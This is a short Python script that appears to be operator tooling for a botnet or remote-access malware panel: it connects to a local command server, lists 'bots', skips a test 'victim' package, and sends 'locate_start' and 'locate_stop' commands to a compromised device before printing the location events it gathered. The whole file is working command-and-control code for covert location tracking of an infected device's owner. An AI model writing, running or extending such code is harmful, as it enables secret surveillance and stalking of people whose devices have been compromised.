#!/usr/bin/env python3
"""Starts location tracking and shows the location events reaching the panel."""
import json
import socket
import time


def call(req, timeout=60):
    s = socket.create_connection(("127.0.0.1", 8778), timeout=timeout)
    s.settimeout(None)
    s.sendall(json.dumps(req).encode() + b"\n")
    buf = b""
    while b"\n" not in buf:
        c = s.recv(65536)
        if not c:
            break
        buf += c
    s.close()
    return json.loads(buf.split(b"\n")[0].decode())


bots = call({"op": "list"}, timeout=15).get("bots", [])
real = [b for b in bots if b["info"].get("package") != "com.example.victim"]
if not real:
    print("no real bot")
    raise SystemExit(1)
bid = real[0]["id"]
print("bot:", bid)

r = call({"op": "cmd", "bot": bid, "cmd": "locate_start",
          "args": {"interval_ms": 1500}, "timeout": 30}, timeout=45)
print("locate_start ->", json.dumps(r.get("result", r))[:160])

time.sleep(8)

r = call({"op": "cmd", "bot": bid, "cmd": "locate_stop", "timeout": 30}, timeout=45)
print("locate_stop  ->", json.dumps(r.get("result", r))[:120])

ev = call({"op": "bot_events", "bot": bid}, timeout=15).get("events", [])
loc = [e for e in ev if e.get("data", {}).get("data", {}).get("event") == "location"]
print(f"\nlocation events: {len(loc)}")
for e in loc[-4:]:
    print(json.dumps(e["data"]["data"], ensure_ascii=False)[:280])
